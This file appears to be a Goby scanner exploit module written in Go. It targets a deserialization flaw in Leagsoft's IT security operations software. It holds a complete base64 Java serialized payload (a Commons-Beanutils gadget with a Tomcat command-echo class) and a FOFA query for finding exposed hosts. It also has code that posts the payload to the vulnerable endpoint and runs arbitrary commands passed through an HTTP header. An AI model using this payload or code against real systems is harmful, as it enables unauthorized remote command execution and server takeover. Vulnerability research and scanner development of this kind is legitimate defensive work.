package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Leagsoft  IT Security Operation Deserialization Vulnerability",
    "Description": "<p>Leagsoft IT security operation and maintenance management software, developed by Leagsoft Technology for more than ten years, integrates network access control, terminal security management, BYOD equipment management, antivirus management, server security management, data leakage prevention, anti-APT attack and other systems. Through a platform, unified framework and data concentration, it can achieve stronger and more intelligent security protection, reduce the burden of security management, and reduce procurement and maintenance costs.</p><p>Leagsoft IT security operation and maintenance management software, the queryPolicyUseConditionDetail method in the PolicySetDetailController performs the deserialization operation in the process of processing the input parameters. The Commons-Beanutils deserialization chain can be used for RCE. An attacker can use this vulnerability to execute arbitrary code, execute commands on the server, enter memory shell and other operations, and obtain server privileges.</p>",
    "Product": "Leagsoft-IT-Sec-OPS",
    "Homepage": "http://www.leagsoft.com",
    "DisclosureDate": "2023-02-01",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": "title=\"联软IT安全运维管理系统\" || body=\"action=\\\"/manager/loginController.htm?act=login\" || header=\"/manager/login.jsp\"",
    "GobyQuery": "title=\"联软IT安全运维管理系统\" || body=\"action=\\\"/manager/loginController.htm?act=login\" || header=\"/manager/login.jsp\"",
    "Level": "3",
    "Impact": "<p>Leagsoft IT security operation and maintenance management software, the queryPolicyUseConditionDetail method in the PolicySetDetailController performs the deserialization operation in the process of processing the input parameters. The Commons-Beanutils deserialization chain can be used for RCE. An attacker can use this vulnerability to execute arbitrary code, execute commands on the server, enter memory shell and other operations, and obtain server privileges.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.leagsoft.com\">http://www.leagsoft.com</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "command",
            "type": "input",
            "value": "whoami",
            "show": "AttackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "联软 IT 安全运维管理软件反序列化漏洞",
            "Product": "联软科技-IT安全运维管理系统",
            "Description": "<p>联软科技持续十多年研发的联软IT安全运维管理软件，集网络准入控制、终端安全管理、BYOD设备管理、杀毒管理、服务器安全管理、数据防泄密、反APT攻击等系统于一体，通过一个平台，统一框架，数据集中，实现更强更智能的安全保护，减轻安全管理负担，降低采购和维护成本。</p><p>联软IT安全运维管理软件，在 PolicySetDetailController 中 的queryPolicyUseConditionDetail 方法在对输入参数进行处理的过程中进行了反序列化操作，可使用 Commons-Beanutils 反序列化链进行RCE。攻击者可利用该漏洞执行任意代码，在服务器上执行命令、打入内存马等操作，获取服务器权限。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.leagsoft.com\">http://www.leagsoft.com</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>联软IT安全运维管理软件，在 PolicySetDetailController 中 的queryPolicyUseConditionDetail 方法在对输入参数进行处理的过程中进行了反序列化操作，可使用 Commons-Beanutils 反序列化链进行RCE。攻击者可利用该漏洞执行任意代码，在服务器上执行命令、打入内存马等操作，获取服务器权限。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Leagsoft  IT Security Operation Deserialization Vulnerability",
            "Product": "Leagsoft-IT-Sec-OPS",
            "Description": "<p>Leagsoft IT security operation and maintenance management software, developed by Leagsoft Technology for more than ten years, integrates network access control, terminal security management, BYOD equipment management, antivirus management, server security management, data leakage prevention, anti-APT attack and other systems. Through a platform, unified framework and data concentration, it can achieve stronger and more intelligent security protection, reduce the burden of security management, and reduce procurement and maintenance costs.</p><p>Leagsoft IT security operation and maintenance management software, the queryPolicyUseConditionDetail method in the PolicySetDetailController performs the deserialization operation in the process of processing the input parameters. The Commons-Beanutils deserialization chain can be used for RCE. An attacker can use this vulnerability to execute arbitrary code, execute commands on the server, enter memory shell and other operations, and obtain server privileges.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.leagsoft.com\">http://www.leagsoft.com</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Leagsoft IT security operation and maintenance management software, the queryPolicyUseConditionDetail method in the PolicySetDetailController performs the deserialization operation in the process of processing the input parameters. The Commons-Beanutils deserialization chain can be used for RCE. An attacker can use this vulnerability to execute arbitrary code, execute commands on the server, enter memory shell and other operations, and obtain server privileges.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10709"
}`

	exploitLeagsoft12389714195050 := func(u *httpclient.FixUrl, payload string, cmd string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/DBAService/PolicySetDetailController/queryPolicyUseConditionDetail")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Data = "base64Serializable=" + strings.ReplaceAll(payload, "+", "%2b")

		if cmd != "" {
			cfg.Header.Store("X-Token-Data", cmd)
		}

		return httpclient.DoHttpRequest(u, cfg)
	}

	echoPayloadBase64 := "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LPjgGC/k7xfgIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAAAAAAAdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAEb/K/rq+AAAAMQD1AQA8b3JnL2FwYWNoZS90b21jYXQvY2F0YWxpbmEvd2VicmVzb3VyY2VzL1RvbWNhdEphcklucHV0U3RyZWFtBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA+TG9yZy9hcGFjaGUvdG9tY2F0L2NhdGFsaW5hL3dlYnJlc291cmNlcy9Ub21jYXRKYXJJbnB1dFN0cmVhbTsMAAUABgoABAAMAQABcQEAMyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAB2V4ZWNDbWQMABAADwoAAgARAQAIPGNsaW5pdD4BAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HABQBAB9qYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uBwAWAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAGAEAAWUBACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAA2NscwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEdmFyNQEAIUxqYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uOwEABGJhb3MBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQAJcHJvY2Vzc29yAQASTGphdmEvbGFuZy9PYmplY3Q7AQADcmVxAQAEcmVzcAEAAWoBAAFJAQABdAEAEkxqYXZhL2xhbmcvVGhyZWFkOwEAA3N0cgEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA29iagEACnByb2Nlc3NvcnMBABBMamF2YS91dGlsL0xpc3Q7AQABaQEABGZsYWcBAAFaAQAFZ3JvdXABABdMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEAAWYBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAHdGhyZWFkcwEAE1tMamF2YS9sYW5nL1RocmVhZDsBABVqYXZhL2xhbmcvVGhyZWFkR3JvdXAHADgBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAOgcANwEAEGphdmEvbGFuZy9UaHJlYWQHAD0BABBqYXZhL2xhbmcvU3RyaW5nBwA/AQAOamF2YS91dGlsL0xpc3QHAEEBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQcAQwEADVN0YWNrTWFwVGFibGUBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsMAEYARwoAPgBIAQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7DABKAEsKAD4ATAEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwATgBPCgAEAFAIADYBAA9qYXZhL2xhbmcvQ2xhc3MHAFMBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DABVAFYKAFQAVwEADXNldEFjY2Vzc2libGUBAAQoWilWDABZAFoKADsAWwEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABdAF4KADsAXwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwwAYQBiCgA+AGMBAARleGVjCABlAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAGcAaAoAQABpAQAEaHR0cAgAawEABnRhcmdldAgAbQEAEmphdmEvbGFuZy9SdW5uYWJsZQcAbwEABnRoaXMkMAgAcQEAB2hhbmRsZXIIAHMBAA1nZXRTdXBlcmNsYXNzDAB1AE8KAFQAdgEABmdsb2JhbAgAeAgALQEABHNpemUBAAMoKUkMAHsAfAsAQgB9AQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DABdAH8LAEIAgAgAJAEAC2dldFJlc3BvbnNlCACDAQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwAhQCGCgBUAIcBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHAIkBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAIsAjAoAigCNAQAJZ2V0SGVhZGVyCACPAQAMWC1Ub2tlbi1EYXRhCACRAQAHaXNFbXB0eQEAAygpWgwAkwCUCgBAAJUBAAlzZXRTdGF0dXMIAJcBABFqYXZhL2xhbmcvSW50ZWdlcgcAmQEABFRZUEUMAJsAHQkAmgCcAQAEKEkpVgwABQCeCgCaAJ8MAA4ADwoAAgChAQAkb3JnLmFwYWNoZS50b21jYXQudXRpbC5idWYuQnl0ZUNodW5rCACjAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAKUApgoAVACnAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwAqQCqCgBUAKsBAAhzZXRCeXRlcwgArQEA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"

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randStr := goutils.RandomHexString(12)
			resp, err := exploitLeagsoft12389714195050(u, echoPayloadBase64, "echo "+randStr)
			return err == nil && strings.Contains(resp.RawBody, randStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "cmd" {
				cmd := ss.Params["command"].(string)
				resp, err := exploitLeagsoft12389714195050(expResult.HostInfo, echoPayloadBase64, cmd)
				if err == nil {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
